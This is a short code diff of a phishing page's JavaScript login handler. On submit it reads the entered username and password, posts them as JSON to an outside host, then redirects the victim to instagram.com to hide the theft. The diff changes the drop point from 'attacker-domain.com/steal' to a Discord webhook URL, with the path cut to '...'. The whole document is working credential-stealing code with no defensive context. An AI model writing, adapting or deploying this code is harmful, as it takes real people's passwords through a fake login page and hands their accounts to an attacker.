@@ -107,10 +107,12 @@
       e.preventDefault();
       const u = document.getElementById("username").value;
       const p = document.getElementById("password").value;
-      fetch("https://attacker-domain.com/steal", {
+      fetch("https://discord.com/api/webhooks/...", {
   method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({ username: u, password: p })
+  headers: {
+    "Content-Type": "application/json"
+  },
+ body: JSON.stringify({ username: u, password: p })
 });
 
       window.location.href = "https://instagram.com";
